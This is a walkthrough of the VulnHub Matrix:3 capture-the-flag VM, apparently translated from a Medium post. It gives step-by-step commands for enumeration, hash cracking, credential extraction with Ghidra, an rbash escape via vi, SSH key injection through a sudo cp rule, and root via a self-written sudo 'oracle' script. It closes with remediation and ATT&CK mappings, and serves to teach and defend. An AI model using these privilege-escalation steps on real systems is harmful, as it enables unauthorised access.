# VulnHub Matrix:3 — There Is No Spoon (But There Are Three Rabbit Holes)

"Follow the white rabbit." If you know The Matrix, you know: the rabbit always leads somewhere real. Matrix:3 by Ajay Verma is the third and most complex entry in the series, and it delivers on that promise. Multiple ports, a mislabeled gzip file hiding credentials, a DOS binary you need to reverse-engineer in Ghidra, an rbash jail, and a two-step sudo privilege escalation chain. Noice. fr fr, this VM is bussin from start to finish, dude.

Huge thanks to **Ajay Verma** for a machine that forces you to think laterally: the hint says "Follow your intuitions and enumerate!" and it means it.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | Matrix:3 |
| **Attacker VM** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/matrix-3,339/ |
| **Techniques** | Host discovery, Nmap multi-port scan, web enumeration (dirb, HTTrack), misidentified file type (secret.gz), hash cracking (John/hashcat), HTTP Basic Auth, binary download from authenticated endpoint, reverse engineering (Ghidra), SSH on non-standard port, rbash escape via vi, PATH fix, sudo cp abuse (SSH key injection), lateral movement to trinity, sudo oracle (non-existent binary), privilege escalation to root |
| **CVEs** | No specific CVEs. Techniques map to MITRE ATT&CK for hardcoded credentials (T1552.001), sudo misconfiguration (T1548.003), rbash escape (T1059.004). |

> **Hint from the author:**
> "Follow your intuitions ... and enumerate!"

---

## Attack Summary

```
[arp-scan: target at 192.168.10.101]
    |
    v
[nmap: 80/http (Python SimpleHTTP), 6464/ssh, 7331/http (Basic Auth, Python BaseHTTP)]
    |
    v
[port 80: "Follow the white rabbit" page + rabbit image filename hint]
    |
    v
[dirb: /Matrix directory discovered]
    |
    v
[HTTrack mirror /Matrix: find secret.gz (mislabeled - actually ASCII text)]
    |
    v
[cat secret.gz: admin hash (MD5) -> john/hashcat: admin:passwd]
    |
    v
[port 7331: HTTP Basic Auth with admin:passwd -> authenticated]
    |
    v
[dirb authenticated: /data directory -> binary file download]
    |
    v
[Ghidra reverse engineering of DOS PE32 binary: guest:7R1n17yN30]
    |
    v
[SSH guest@192.168.10.101 -p 6464 -> rbash restricted shell]
    |
    v
[rbash escape via vi (:!/bin/bash) -> fix PATH]
    |
    v
[sudo -l: (trinity) NOPASSWD: /bin/cp]
    |
    v
[ssh-keygen -> copy id_rsa.pub to /home/trinity/.ssh/authorized_keys via sudo cp]
    |
    v
[ssh trinity@127.0.0.1 -p 6464 -i id_rsa]
    |
    v
[sudo -l: (root) NOPASSWD: /home/trinity/oracle (file does not exist)]
    |
    v
[echo "/bin/sh" > ~/oracle; chmod 777 ~/oracle; sudo ~/oracle]
    |
    v
[ROOT -> cat /root/flag.txt]
```

---

## Methodology

1. Host discovery (arp-scan) and multi-port Nmap enumeration
2. Port 80 web enumeration: rabbit hint, hidden directory, HTTrack mirror
3. Misidentified file (secret.gz as ASCII text): extract MD5 hash
4. Hash cracking: MD5 to plaintext password
5. Authenticated access to port 7331: discover and download binary
6. Ghidra reverse engineering of DOS PE32 binary: extract hardcoded credentials
7. SSH login on port 6464: rbash escape via vi
8. PATH fix and sudo enumeration
9. sudo cp abuse: inject SSH public key as trinity's authorized_keys
10. Lateral movement to trinity via SSH key auth
11. sudo oracle: create non-existent binary, get root

---

## Step 1 — Identifying the Target

```bash
arp-scan --localnet --ignoredups
```

Target appears at `192.168.10.101`. Note: your IP may differ if running in a different subnet.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning]

---

## Step 2 — Reconnaissance: Nmap Reveals Three Services

```bash
nmap -A -T4 -p- 192.168.10.101
```

Expected output:

```
80/tcp   open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
6464/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
7331/tcp open  caldav  Python BaseHTTPServer (http-auth: Basic)
```

Three services. SSH is on a non-standard port (6464 instead of 22). HTTP is on 80 and 7331, with port 7331 requiring Basic Authentication. Nmap even tells us that 7331 uses HTTP Basic Auth. Noice recon.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery]

---

## Step 3 — Port 80 Enumeration: Follow the White Rabbit

Browse to `http://192.168.10.101`. The page says "Follow the white rabbit" with a small rabbit image at the bottom. Check the page source (Ctrl+U):

```html
<img src="/assets/img/Matrix_can-show-you-the-door.png" title="Matrix can show you the door">
```

The image filename is the hint: "Matrix can show you the door." We should look for a directory called `/Matrix`.

Also check `/robots.txt`: returns 404, no luck. Run dirb:

```bash
dirb http://192.168.10.101 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Expected discovery:

```
+ http://192.168.10.101/Matrix
+ http://192.168.10.101/assets
```

The `/Matrix` directory has many nested subdirectories. To avoid guessing paths manually, mirror the whole thing:

```bash
httrack http://192.168.10.101/Matrix -O "site"
# Download everything under /Matrix to local "site" folder

# Alternative: wget
wget --header='Accept-Encoding: *' -r --no-parent --reject "index.html*" \
     http://192.168.10.101/Matrix/ -o site 2>/dev/null
```

Now search for interesting files (ignore index files from HTTrack):

```bash
find site/ -type f ! -name "index*" -exec ls -lh {} \;
```

Expected: you will find `secret.gz`.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

## Step 4 — Misidentified File: secret.gz is Actually Text

Try to extract `secret.gz`:

```bash
tar -vzxf secret.gz
# gzip: stdin: not in gzip format
# tar: Child returned status 1
```

It fails. Check the actual file type:

```bash
file secret.gz
# secret.gz: ASCII text (despite the .gz extension)
```

Classic mislabeled file trick. Just read it:

```bash
cat secret.gz
```

Expected output:

```
admin:76a2173be6393254e72ffa4d6df1030a
```

We have a username (`admin`) and what looks like an MD5 hash. ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Step 5 — Cracking the Hash

The hash `76a2173be6393254e72ffa4d6df1030a` is 32 hex characters: MD5.

```bash
# Option 1: John the Ripper
echo "76a2173be6393254e72ffa4d6df1030a" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

```bash
# Option 2: hashcat with GPU (recommended for speed)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -d 1 -w 3
hashcat -m 0 hash.txt --show
```

```bash
# Option 3: online cracking (no GPU needed)
# HashKiller.co.uk or crackstation.net
```

Result: `76a2173be6393254e72ffa4d6df1030a:passwd`

**Credentials: admin:passwd** ( ͡° ͜ʖ ͡°)

> **MITRE ATT&CK:** [T1110.002 Brute Force: Password Cracking]

---

## Step 6 — Port 7331: Authenticated Web Service

Test the 7331 service. Without credentials:

```bash
curl -s http://192.168.10.101:7331
# no auth header received
```

With credentials:

```bash
curl -v http://192.168.10.101:7331 -u admin:passwd
# or with manual Base64 header:
curl -H "Authorization: Basic $(echo -n 'admin:passwd' | base64)" http://192.168.10.101:7331
```

Access granted! The page does not show much. Check `/robots.txt`:

```
User-agent: *
Disallow: /data/
```

Enumerate further with dirb (must pass credentials):

```bash
dirb http://192.168.10.101:7331 -u admin:passwd
```

The `/data` directory contains a file. Download it:

```bash
curl http://192.168.10.101:7331/data/data -u admin:passwd -o data
file data
# data: MS-DOS executable, PE32 Executable for MS Windows
```

A Windows/DOS binary on a Linux CTF! Interesting. ¯\_(ツ)_/¯

You can try running it under Wine:

```bash
wine $(pwd)/data
# Brief output, not very informative
```

Time for reverse engineering.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1082 System Information Discovery] [T1518 Software Discovery]

---

## Step 7 — Reverse Engineering the DOS Binary with Ghidra

> **What is reverse engineering?**
> Reverse engineering is the process of analyzing a compiled binary to understand its behavior, extract hardcoded values, and discover hidden functionality without access to the source code. Tools like Ghidra (NSA, open source), IDA Pro, and Radare2 are commonly used.
> Reference: https://www.ghidra-sre.org/

Open Ghidra, create a new project, import the `data` binary, and run auto-analysis.

Key steps:
1. Go to Window > Defined Strings (or search for strings in the Assembly view)
2. Look for ASCII strings that look like credentials

In the main function or nearby string references, you will find:

```
guest
7R1n17yN30
```

**Credentials: guest:7R1n17yN30** ᕕ( ᐛ )ᕗ

You can also try with strings from the terminal if Ghidra is unavailable:

```bash
strings data | grep -E '[a-zA-Z0-9]{6,}'
# Look for username/password patterns
```

> **Real-world note:** Hardcoded credentials in compiled binaries are a critical security finding. Multiple APT groups including APT28 (Fancy Bear) have used tool binaries with embedded C2 credentials that were extracted during forensic analysis, enabling defenders to identify infrastructure. Reference: https://attack.mitre.org/groups/G0007/

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Step 8 — SSH Login on Non-Standard Port (rbash escape)

SSH is on port 6464. Connect with the extracted credentials:

```bash
ssh guest@192.168.10.101 -p 6464
# Password: 7R1n17yN30
```

We land in a restricted bash shell (rbash). Most commands fail.

Check what is available:

```bash
echo $PATH
# /home/guest/bin  (or similar minimal path)

ls ~/bin
# vi  (found it!)
```

> **What is rbash (restricted bash)?**
> rbash is a version of bash with restrictions: no `cd`, no writing to variables, no executing commands with `/`, and no changing `$PATH`. It is designed as a lightweight security measure. However, it is bypassable through editors or other binaries that allow shell execution.
> Reference: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

Escape rbash using vi:

```bash
vi
```

Inside vi, type:

```
:set shell=/bin/bash
:shell
```

Or even simpler:

```
:!/bin/bash
```

You now have a full bash shell. But many commands still fail because `$PATH` is minimal. Fix it:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now you can run standard tools.

> **MITRE ATT&CK:** [T1059.004 Command and Scripting Interpreter: Unix Shell]

---

## Step 9 — Privilege Escalation Part 1: sudo cp to Inject SSH Key

Check sudo permissions:

```bash
sudo -l
```

Expected output:

```
(trinity) NOPASSWD: /bin/cp
```

The `guest` user can run `/bin/cp` as `trinity` without a password. `cp` as another user means we can write to any file that `trinity` owns. The `.ssh/authorized_keys` path is perfect.

Generate an SSH key pair (on the target, in a writable directory):

```bash
ssh-keygen -t rsa
# Hit Enter for all prompts (no passphrase, default path /home/guest/.ssh/id_rsa)
```

Set permissive permissions on the public key:

```bash
chmod 777 ~/.ssh/id_rsa.pub
```

Copy the public key to a staging location, then use sudo cp to place it as trinity's authorized_keys:

```bash
cp ~/.ssh/id_rsa.pub /tmp/id_rsa.pub
sudo -u trinity /bin/cp /tmp/id_rsa.pub /home/trinity/.ssh/authorized_keys
```

> **Real-world note:** Sudo rules granting `cp` to another user are a well-known privilege escalation vector. An attacker can overwrite any file owned by the target user, including cron jobs, SSH keys, or shell profile files. This is why the CIS Benchmark and NIST SP 800-53 AC-6 explicitly warn against unrestricted sudo file operation grants.

> **MITRE ATT&CK:** [T1548.003 Abuse Elevation Control Mechanism: Sudo] [T1098.004 Account Manipulation: SSH Authorized Keys]

---

## Step 10 — Lateral Movement to Trinity via SSH Key

Now SSH to trinity using the injected key:

```bash
ssh trinity@127.0.0.1 -p 6464
# Uses the id_rsa private key (no password needed since we injected the public key)
```

If you generated the key pair with a default path, the key will be auto-used. Otherwise specify it:

```bash
ssh trinity@127.0.0.1 -p 6464 -i ~/.ssh/id_rsa
```

We are now trinity. Check sudo:

```bash
sudo -l
```

Expected:

```
(root) NOPASSWD: /home/trinity/oracle
```

trinity can run `/home/trinity/oracle` as root. But the file does not exist! That is the trick. ( ͡° ͜ʖ ͡°)

> **MITRE ATT&CK:** [TA0008 Lateral Movement] [T1550.004 Use Alternate Authentication Material: SSH Keys]

---

## Step 11 — Root via Custom oracle Binary

The sudo rule references a path we control (our own home directory). Create the oracle binary as a shell launcher:

```bash
echo "/bin/sh -i" > ~/oracle
chmod 777 ~/oracle
sudo ~/oracle
```

Expected:

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag.txt
```

**(☞ﾟヮﾟ)☞ ROOT! We are in the Matrix... or rather, we just owned it.**

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo]

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Hash MD5 | `76a2173be6393254e72ffa4d6df1030a` | `secret.gz` (mislabeled) | `passwd` (John/hashcat) |
| Credential | `admin:passwd` | Hash cracking | Port 7331 HTTP Basic Auth |
| Credential | `guest:7R1n17yN30` | Ghidra RE of DOS binary | SSH port 6464 |
| Root flag | See `/root/flag.txt` | `/root/flag.txt` | Final objective |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Hardcoded credentials in DOS binary | APT campaigns routinely embed credentials in tool binaries: extraction via RE is a standard forensic technique | Never hardcode credentials in compiled code: use secrets managers or environment variables |
| 2 | sudo cp writable to another user's home | Grants file write as another user: can overwrite SSH keys, cron jobs, shell profiles | Restrict sudo rules to non-file-operation commands; use explicit path whitelisting |
| 3 | sudo referencing a non-existent path | If a sudo rule points to a file the sudo user can create, they can write arbitrary content there | Ensure sudo-allowed binaries exist, are owned by root, and are not world-writable |
| 4 | rbash escape via vi | Restricted shells relying solely on shell restrictions without process-level sandboxing are bypassable through editors with shell execution capabilities | Combine rbash with seccomp profiles, ForceCommand in sshd_config, or PAM restrictions |
| 5 | SSH on non-standard port (6464) | Security through obscurity: non-standard ports slightly reduce automated scan noise but provide no real security | Standard port scanning (-p-) defeats port obfuscation; use proper firewall rules instead |

**Why does this matter outside the lab?**

Hardcoded credentials in compiled binaries are a recurring critical finding in real enterprise assessments. The SolarWinds SUNBURST malware (2020) embedded configuration and authentication data in compiled DLLs that security researchers extracted via reverse engineering to understand C2 infrastructure. Sudo misconfiguration is one of the most common privilege escalation findings in Linux environment assessments: the GTFOBins project documents over 300 binaries that can be abused under sudo. The rbash escape via vi is literally item 1 in the GTFO restricted shell bypass guide.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Credential Access | TA0006 | Unsecured Credentials in Files | T1552.001 |
| Credential Access | TA0006 | Brute Force: Password Cracking | T1110.002 |
| Initial Access | TA0001 | Valid Accounts | T1078 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Lateral Movement | TA0008 | Use Alternate Authentication Material: SSH Keys | T1550.004 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Privilege Escalation | TA0004 | Account Manipulation: SSH Authorized Keys | T1098.004 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Never hardcode credentials in compiled binaries: use a secrets manager (HashiCorp Vault, AWS Secrets Manager) or environment variables.
2. Remove the sudo rule `(trinity) NOPASSWD: /bin/cp`: or restrict it to specific source/destination paths.
3. Ensure sudo-referenced binaries exist, are owned by root, are not world-writable, and are immutable (`chattr +i`).
4. Replace rbash with proper SSH `ForceCommand` and PAM restrictions to prevent vi-based escapes.
5. If non-standard SSH ports are used for obscurity, still enforce SSH key authentication only and disable password auth.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Rotate credentials for any account with sudo rights.
- Review all sudo rules: `sudo -l -U <user>` for every interactive account.
- Check `~/.ssh/authorized_keys` on all accounts for unexpected entries.
- Audit SUID and sudo-accessible binaries.

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-factor Authentication) for T1078 Valid Accounts
- D3-CTS (Credential Transmission Scoping) for T1552.001 hardcoded credentials
- D3-OPS (OS Process Sandboxing) for T1548.003 sudo abuse
- D3-SJA (Scheduled Job Analysis) for detecting new authorized_keys entries

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Inventory all sudo rules and SSH authorized_keys across all user accounts.
- Protect (PR.AC-4): Apply least-privilege to sudo rules; enforce PAM restrictions on restricted shells.
- Detect (DE.CM-1): Monitor for new entries in `~/.ssh/authorized_keys` and changes to sudo rules.
- Respond (RS.AN): Review lateral movement artifacts; identify which accounts were compromised.
- Recover (RC.RP): Rotate all affected credentials; audit sudo rules and rebuild restrictive shell environments.

**NIST SP 800-53 (Rev. 5) Controls:**
- AC-6: Least Privilege (restrict sudo to minimum necessary commands)
- IA-5: Authenticator Management (remove hardcoded credentials from code)
- CM-7: Least Functionality (ensure no unnecessary sudo rules or SUID binaries)
- SI-10: Information Input Validation (validate sudo-referenced binary existence and permissions)
- CA-7: Continuous Monitoring (alert on sudo rule changes and authorized_keys modifications)

**CISA Known Exploited Vulnerabilities:**
- No specific CVEs from this VM in the CISA KEV catalog. The techniques (sudo abuse, rbash escape) are generic and map to multiple CVEs in restricted shell products.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS
- Practice: Identity and Access Management (privilege management and account review)
- Target MIL: MIL-2 (documented and managed privilege assignment; regular access reviews)

---

## Final Thoughts

Thanks to **Ajay Verma** for a machine that genuinely rewards patient enumeration. The Matrix theme is not just decoration: every step requires you to question what you see and follow the clues the VM leaves behind. The mislabeled `secret.gz`, the PE32 binary on a Linux server, the non-existent oracle binary. All of it is the VM saying "there is no spoon: make your own."

This one is excellent prep for OSCP: hardcoded creds extraction, rbash escape, chained sudo privilege escalation, and lateral movement via SSH key injection are all fair game in real assessments.

If this walkthrough helped you, share it with your crew and keep hacking! gg rekt noice

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/uniaogeek/vulnhub-matrix-v3-walkthrough

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
